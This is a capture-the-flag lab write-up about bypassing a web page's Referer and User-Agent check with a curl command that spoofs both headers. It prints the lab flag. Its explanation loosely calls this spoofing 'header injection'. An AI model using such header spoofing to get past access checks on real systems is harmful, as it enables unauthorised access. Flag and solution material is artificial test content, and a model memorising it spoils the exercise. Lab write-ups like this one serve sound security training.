# Header Injection

## Flag
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Discovery and Exploitation

1. Navigate to the page: http://192.168.11.103/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

2. Notice the following comments in the page source
```
<!-- 
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->

Let's use this browser : "ft_bornToSec". It will help you a lot.

```

3. Execute the following curl command to set the appropriate referrer (-e) and User-Agent (-A):

```bash
curl -e https://www.nsa.gov/ -A "ft_bornToSec" http://192.168.11.103/\?page\=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f  | grep flag
```

## Why it works

Header injection works by manipulating HTTP headers to inject malicious content into a web application's responses. In this case, the application checks the referrer and User-Agent headers to determine if the request is coming from the correct source. By setting the correct referrer and User-Agent headers, we can bypass this check and access the flag.

The `-e` option in tools like `curl` is used to set the referrer header in an HTTP request. For example, `curl -e "http://example.com" http://target.com` sets the referrer to "http://example.com" when making a request to "http://target.com".